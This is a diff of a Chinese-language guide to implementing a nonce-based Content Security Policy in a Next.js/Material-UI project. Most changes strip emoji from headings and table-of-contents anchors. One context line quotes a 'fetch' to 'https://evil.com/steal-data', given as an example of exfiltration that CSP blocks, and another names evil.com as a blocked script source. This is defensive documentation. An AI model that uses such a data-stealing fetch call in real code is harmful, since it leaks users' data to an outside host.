@@ -4,18 +4,18 @@
 
 ---
 
-## 📋 目錄
+## 目錄
 
 - [Content Security Policy (CSP) 實作指南](#content-security-policy-csp-實作指南)
-  - [📋 目錄](#-目錄)
-  - [📖 概述](#-概述)
+  - [目錄](#目錄)
+  - [概述](#概述)
     - [為什麼需要 CSP？](#為什麼需要-csp)
     - [NPT 專案的 CSP 策略](#npt-專案的-csp-策略)
-  - [🏗️ CSP 架構](#️-csp-架構)
-  - [🔐 Nonce-based 策略](#-nonce-based-策略)
+  - [CSP 架構](#csp-架構)
+  - [Nonce-based 策略](#nonce-based-策略)
     - [什麼是 Nonce?](#什麼是-nonce)
     - [為什麼不用 'unsafe-inline'?](#為什麼不用-unsafe-inline)
-  - [🛡️ CSP 指令說明](#️-csp-指令說明)
+  - [CSP 指令說明](#csp-指令說明)
     - [當前配置](#當前配置)
     - [指令詳解](#指令詳解)
       - [1. `default-src 'self'`](#1-default-src-self)
@@ -25,36 +25,33 @@
       - [5. `img-src 'self' data: https:`](#5-img-src-self-data-https)
       - [6. `frame-ancestors 'none'`](#6-frame-ancestors-none)
       - [7. `object-src 'none'`](#7-object-src-none)
-  - [🔄 整合流程](#-整合流程)
+  - [整合流程](#整合流程)
     - [1. Middleware 生成 Nonce](#1-middleware-生成-nonce)
     - [2. Layout 讀取 Nonce](#2-layout-讀取-nonce)
     - [3. Providers 傳遞 Nonce](#3-providers-傳遞-nonce)
     - [4. ThemeRegistry 應用 Nonce](#4-themeregistry-應用-nonce)
-    - [5. Emotion Cache 配置 Nonce](#5-emotion-cache-配置-nonce)
-  - [🧪 測試與驗證](#-測試與驗證)
+  - [測試與驗證](#測試與驗證)
     - [1. 檢查 CSP Header](#1-檢查-csp-header)
     - [2. 檢查樣式標籤](#2-檢查樣式標籤)
     - [3. 檢查 CSP 違規報告](#3-檢查-csp-違規報告)
     - [4. 功能測試清單](#4-功能測試清單)
-  - [🆘 疑難排解](#-疑難排解)
+  - [疑難排解](#疑難排解)
     - [問題 1: 頁面白屏，樣式無法載入](#問題-1-頁面白屏樣式無法載入)
     - [問題 2: GraphQL 請求被阻止](#問題-2-graphql-請求被阻止)
     - [問題 3: 外部 CDN 資源無法載入](#問題-3-外部-cdn-資源無法載入)
     - [問題 4: 開發環境 DevTools 問題](#問題-4-開發環境-devtools-問題)
-  - [🔒 安全考量](#-安全考量)
+  - [安全考量](#安全考量)
     - [1. Nonce 的強度](#1-nonce-的強度)
     - [2. 'strict-dynamic' 的影響](#2-strict-dynamic-的影響)
     - [3. 生產環境建議](#3-生產環境建議)
     - [4. CSP 監控](#4-csp-監控)
-  - [📚 相關文檔](#-相關文檔)
-  - [✅ 檢查清單](#-檢查清單)
+  - [相關文檔](#相關文檔)
+  - [檢查清單](#檢查清單)
     - [實作完成確認](#實作完成確認)
     - [測試確認](#測試確認)
     - [安全確認](#安全確認)
 
----
-
-## 📖 概述
+## 概述
 
 **Content Security Policy (CSP)** 是一個關鍵的 Web 安全機制，用於防止跨站腳本攻擊 (XSS) 和其他代碼注入攻擊。
 
@@ -69,14 +66,14 @@
 
 我們使用 **nonce-based CSP**，這是目前最安全且最靈活的 CSP 策略：
 
-- 🔐 每個請求生成唯一的隨機 nonce
-- 🎨 支援 Material-UI (Emotion) 動態樣式
-- 🔄 支援 GraphQL WebSocket 訂閱
-- 🚫 阻止所有未授權的腳本和樣式
+- 每個請求生成唯一的隨機 nonce
+- 支援 Material-UI (Emotion) 動態樣式
+- 支援 GraphQL WebSocket 訂閱
+- 阻止所有未授權的腳本和樣式
 
 ---
 
-## 🏗️ CSP 架構
+## CSP 架構
 
 ```text
 ┌─────────────────────────────────────────────────────┐
@@ -121,7 +118,7 @@
 
 ---
 
-## 🔐 Nonce-based 策略
+## Nonce-based 策略
 
 ### 什麼是 Nonce?
 
@@ -157,7 +154,7 @@ script-src 'self' 'nonce-abc123' 'strict-dynamic';  ✅ 安全！
 
 ---
 
-## 🛡️ CSP 指令說明
+## CSP 指令說明
 
 ### 當前配置
 
@@ -185,8 +182,7 @@ const cspDirectives = [
 
 **作用**: 預設所有資源只能來自同源
 
-**允許**: `https://yourapp.com/script.js` ✅
-**阻止**: `https://evil.com/script.js` ❌
+**允許**: `https://yourapp.com/script.js` ✅ **阻止**: `https://evil.com/script.js` ❌
 
 #### 2. `script-src 'self' 'nonce-{nonce}' 'strict-dynamic'`
 
@@ -286,7 +282,7 @@ fetch('https://evil.com/steal-data', { ... });
 
 ---
 
-## 🔄 整合流程
+## 整合流程
 
 ### 1. Middleware 生成 Nonce
 
@@ -384,7 +380,7 @@ export function ThemeRegistry({ children, nonce }: { children: React.ReactNode; 
 
 ---
 
-## 🧪 測試與驗證
+## 測試與驗證
 
 ### 1. 檢查 CSP Header
 
@@ -439,7 +435,7 @@ Refused to connect to 'https://api.example.com' because it violates CSP directiv
 
 ---
 
-## 🆘 疑難排解
+## 疑難排解
 
 ### 問題 1: 頁面白屏，樣式無法載入
 
@@ -525,7 +521,7 @@ const cspDirectives = [
 
 ---
 
-## 🔒 安全考量
+## 安全考量
 
 ### 1. Nonce 的強度
 
@@ -606,7 +602,7 @@ export default function handler(req, res) {
 
 ---
 
-## 📚 相關文檔
+## 相關文檔
 
 - [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
 - [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
@@ -615,7 +611,7 @@ export default function handler(req, res) {
 
 ---
 
-## ✅ 檢查清單
+## 檢查清單
 
 ### 實作完成確認
 
